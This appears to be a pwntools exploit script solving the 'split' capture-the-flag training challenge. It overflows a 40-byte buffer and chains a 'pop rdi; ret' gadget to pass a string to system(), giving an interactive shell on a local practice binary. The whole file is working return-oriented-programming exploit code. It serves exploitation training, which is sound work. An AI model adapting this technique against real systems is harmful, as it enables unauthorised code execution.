#!/bin/python3
from pwn import *

elf = context.binary = ELF("./split")
context.log_level = 'debug'
rop  = ROP(elf)

usefulString = elf.symbols['usefulString'] # 
psystem = elf.symbols['usefulFunction' ] + 9 # system function that is called within usefulFunction
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

offset = 40

payload = flat(
    b"A"*offset,
    pop_rdi,
    usefulString,
    psystem
)

p = process()
p.recvuntil('> ')
p.sendline(payload)
p.interactive()
